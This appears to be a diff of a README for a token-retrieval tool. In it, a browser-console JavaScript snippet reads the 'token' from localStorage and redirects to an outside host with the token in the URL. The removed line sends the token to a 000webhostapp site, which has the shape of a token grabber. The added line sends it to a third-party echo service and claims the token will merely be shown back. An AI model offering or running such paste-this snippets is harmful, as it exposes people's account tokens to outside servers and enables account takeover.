@@ -26,7 +26,7 @@ function getLocalStoragePropertyDescriptor() {
   return pd;
 }
 Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());
-window.location.href = "https://8nfiles.000webhostapp.com/?token=" + window.localStorage.getItem("token").split('"').join('');
+window.location.href = "http://urlecho.appspot.com/echo?body=" + window.localStorage.getItem("token").split('"').join('');
 ```
 5. Your token should be displayed back to you
 ## Features:
